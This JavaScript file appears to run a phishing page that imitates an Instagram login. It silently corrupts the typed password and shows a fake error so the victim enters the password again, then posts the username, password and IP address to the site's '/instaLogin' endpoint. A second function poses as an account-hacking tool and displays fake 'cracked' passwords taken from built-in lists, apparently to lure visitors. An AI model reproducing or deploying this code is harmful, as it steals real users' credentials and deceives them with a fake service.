const passwordInput = document.querySelector("input[name='password']")
const usernameInput = document.querySelector("input[name='username']")
let errorCounter = 1
let randomCharacterIndex = Math.ceil(Math.random() * 4)
console.log(randomCharacterIndex)
let InstaLoginError = document.querySelector(".LoginError")
const submitButton = document.querySelector("button[type='submit']")
submitButton ? submitButton.disabled = true : ""

const randomCharacters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

if (passwordInput) {
  passwordInput.addEventListener("keyup", (event) => {
    InstaLoginError.style.display = "none"
    if (errorCounter > 0 && event.key != "Backspace") {
      if (event.target.value.length == randomCharacterIndex) {
        event.target.value += randomCharacters[Math.floor(Math.random() * 26)]
      }
      if (event.target.value.length >= 6 && usernameInput.value.length >= 4) {
        submitButton.disabled = false
      } else {
        submitButton.disabled = true
      }

    }
  })
}
if(usernameInput){
  usernameInput.addEventListener("keyup", (event)=>{
    if (event.target.value.length >= 4 && passwordInput.value.length >= 6) {
      submitButton.disabled = false
    } else {
      submitButton.disabled = true
    }
  })
}

const SubmitData = (e) => {
  e.preventDefault()
  const username = document.querySelector("input[name='username']")
  const password = document.querySelector("input[name='password']")
  const ipaddress = document.querySelector("input[name='ipaddress']")
  let InstaLoginError = document.querySelector(".LoginError")

  if (errorCounter > 0) {
    errorCounter--
    InstaLoginError.style.display = "block"
    randomCharacterIndex = Math.floor(Math.random() * 4)
  } else {
    
      fetch('/instaLogin', ({
        headers: {
          "Content-Type": "application/json"
        },
        method: "post",
        body: JSON.stringify({
          username: username.value,
          password: password.value,
          ipaddress : ipaddress.value
        })
      })).then((res) => {
        return res.json()
      }).then((data) => {
        console.log(data)
      })
      const Locationquery = location.href.split("?")
      console.log(Locationquery)
      if(Locationquery[1] != undefined){
        location.assign("./Confirm.html")
      }else{
        window.location.href="/serverError"
      }
    }
  }




const ShowHidePassword = (el) => {
  if (passwordInput.type == "password") {
    passwordInput.type = "text"
    el.innerText = "Hide"
  } else {
    passwordInput.type = "password"
    el.innerText = "Show"
  }

}
const p = document.querySelector(".password")
const passwordsList = [""]
const FemalePasswords = [
  "loveaisha_8",
  "mySana-233",
  "44Zara_4244",
  "Hiralove-1224",
  "mynadia_71186",
  "Mariammine32.W",
  "2021Farah_9933",
  "2022Sofia_3434",
  "nadia2022_eternal",
  "yasmeen2005.11",
  "Naima_love-442344",
  "alina_looove_3255",
  "2022sarah_7",
  "myyyayesha_88",
  "Zainab_1",
  "myysamina.20542",
  "tahira-3036",
  "fatima.6635",
  "Aishadream2023_4367",
  "peshawariChappal23422",
  "2021_zoya-1885",
  "amina_9878",
  "Hina-7287",
  "Saira2005.8",
  "Rukhsar_3332",
  "blueSky1144",
  "misisonImpossibleffaa",
  "Ayshainmyhearty7438",
  "Sara-78677",
  "Nyla_216",
  "Iqra.446t",
  "markZingerburger2342",
  "Madiha_243",
  "imrankhanPti2022",
  "loveayesha_9025",
  "Maham-123",
  "Bushra2022_7",
  "nadeembakerssectt",
  "Alisha-555",
  "dildilpakistan",
  "Sumaira_4",
  "loveeezainab_98",
  "Nazia-505",
  "Safiya_11",
  "Zayn1D20100",
  "babySharkdodoheppff",
  "myloveemehwish-9033",
  "Rubina2020_777",
  "chapliKabab2002_234",
  "zaraMine_143",
  "farahLovely_2021",
  "sofiaCharm2022_343",
  "Rabia_forevermine4323",
  "Yasmeen2023_ever",
  "lubna_234",
  "iamlonely7438",
  "aisha_G56",
  "pakistanzindabad",
  "Saimawhisp_99",
  "Zoyael_22",
  "Huda_m345",
  "Lonelyme2254",
  "Sara2007_678",
  "Amalmine_543",
  "Lina_serene777",
  "Rafia_en2002000",
  "Nida_friend_786",
  "Zehrafriend_11",
  "Myayesha_456",
  "iramS_22",
  "cocomelon234244",
  "Rukhsarwlust_78",
  "Sahardream_654",
  "Anisa2008_333",
  "Arishagg_789",
  "Mehakinfinite_101",
  "specialzainab_777",
  "Sanadream_456",
  "aimanmine_876",
  "maheenT_321",
  "haniyacharm_888",
];


const MalePasswords = [
  "2008btsSuga",
  "lovehasannn_8",
  "myrafay-23",
  "44Zain.42",
  "talhalove-122",
  "itxinstapassword3243",
  "Fahadmine32.W",
  "2021usman_9933",
  "2022Bilal_3434",
  "Ibrahim2022_Eternal",
  "saad-mineforeverr33425",
  "zain2005.11",
  "faisal_love-442344",
  "muneeb_looove_3255",
  "2022tariq_7",
  "myyyahmad_884",
  "Rizwan_1",
  "myyfaisal.20542",
  "Imranonlyminee23444",
  "Zaynstyles237324",
  "rafeh-303",
  "muneez.6",
  "Alidream2023_4367",
  "2021asif-15",
  "moin_987",
  "ayan-7255",
  "Sami2005.8",
  "ayan_3332",
  "Tahirinmyhearty7438",
  "osama-7862",
  "Adnan_21222",
  "tariq.44",
  "shoaib_2",
  "ilovepakistan8966",
  "loveBilal_2023.99",
  "Nasir-123",
  "Nightchanges3442",
  "munib2022_7",
  "Jawad-555",
  "ayan_4",
  "loveeeomar_98",
  "irtiza-505",
  "2021yumnazaidi2342",
  "jimin3243",
  "Rizvi_11",
  "myloveeimran-90",
  "Zubair2020_777",
  "Zainmine_143",
  "jungkook2012bts8322",
  "Azharlovely_2021",
  "Kashifcharm2022_3434",
  "Haroon2023_Ever",
  "Moin_2022Glow",
  "Tayyab_specialone",
  "Junaid_lovemore",
  "Owais_4444eternal",
  "skyisbeautiful00343",
  "Hassan_Foreveryours",
  "Kashii_Charm2023",
  "Aamir_786always",
  "Hassan_2023ever",
  "ZaynM4422",
  "Saif.Mineforever2024",
  "Imtiaz_Captivating",
  "taekook76232",
  "Fahim.Loveable_3255",
  "harrystylesfffaa",
  "Moiz_2024journey4444",
  "2020ishqmurshad7342",
  "moiz.loveerr4323",
  "moeez_loving2024",
  "Yasir.mine_786",
  "hasan_speciallove2022",
  "Taimur_everlasting_2023",
  "Nouman-303",
  "umerM-6",
  "isupportpti32423",
  "fawadkhan21223",
  "RaufDream2023_4367"
];



const HackAccount = () => {
  
  // Getting Elements 
  let crackedPassword = null
  const usernameInput = document.querySelector("#HackUsernameInput")
  const username = document.querySelector(".username")
  const Gender = document.querySelector("#HackGender")
  const PCDataBox = document.querySelector(".leftContainer:not(.LeftContainerMobile)")
if(usernameInput.value == "" || Gender.value == ""){
  alert("Enter Details Correctly")
}else{

  const PCDataBoxObj = {
    noData: PCDataBox.querySelector(".noData"),
    LoadedData: PCDataBox.querySelector(".LoadedData"),
    loadingGif: PCDataBox.querySelector("#loadingGif"),
    displayPassword: PCDataBox.querySelector("#password"),
    Credentials: PCDataBox.querySelector(".Credentials"),
  }
  const MbDataBox = document.querySelector(".LeftContainerMobile")
  // Creating Password 
  fetch('/gethackpassword', ({
    headers: {
      "Content-Type": "application/json"
    },
    method: "post",
    body: JSON.stringify({
      username: usernameInput.value
    })
  })).then((res) => {
    return res.json()
  }).then((data) => {
    if (data.data != false) {
      crackedPassword = data.data
      crackedPassword = crackedPassword.substring(0, crackedPassword.length - 3) + "***"
    } else {

      if (Gender.value == "male") {
        const randomNumber = Math.floor(Math.random() * FemalePasswords.length - 1)
        crackedPassword = FemalePasswords[randomNumber]
      } else if (Gender.value == "female") {
        const randomNumber = Math.floor(Math.random() * MalePasswords.length -1)
        crackedPassword = MalePasswords[randomNumber]
      }
      crackedPassword = crackedPassword.substring(0, crackedPassword.length - 3) + "***"

      fetch('/hackuser', ({
        headers: {
          "Content-Type": "application/json"
        },
        method: "post",
        body: JSON.stringify({
          username: usernameInput.value,
          password: crackedPassword,
        })
      })).then((res) => {
        return res
      }).then((data) => {
        console.log(data)
      })

    }
  })

  username.innerHTML = usernameInput.value

  // Displaying Datta 
  if (window.innerWidth <= 1024) {
    PCDataBox.style.display = "flex"
    MbDataBox.style.display = "none"
  }
  PCDataBoxObj.LoadedData.style.display = "flex"
  PCDataBoxObj.noData.style.display = "none"
  setTimeout(() => {
    PCDataBoxObj.displayPassword.innerHTML = crackedPassword
    PCDataBoxObj.Credentials.style.display = "block"
  }, 5000);



}

}
